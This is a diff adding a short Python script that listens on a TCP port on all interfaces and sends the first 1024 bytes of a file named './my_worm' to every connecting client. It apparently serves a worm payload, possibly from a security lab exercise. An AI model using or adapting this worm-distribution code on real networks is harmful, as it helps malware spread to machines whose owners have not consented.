@@ -1,0 +1,19 @@
+#!/usr/bin/env python3
+import socket
+import sys
+
+port = int(sys.argv[1])
+worm_name = "./my_worm"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("0.0.0.0", port))
+s.listen(3)
+
+content = b''
+with open(worm_name, 'rb') as f:
+    content = f.read(1024)
+
+while True:
+    conn, addr = s.accept()
+    conn.send(content)
+    conn.close()
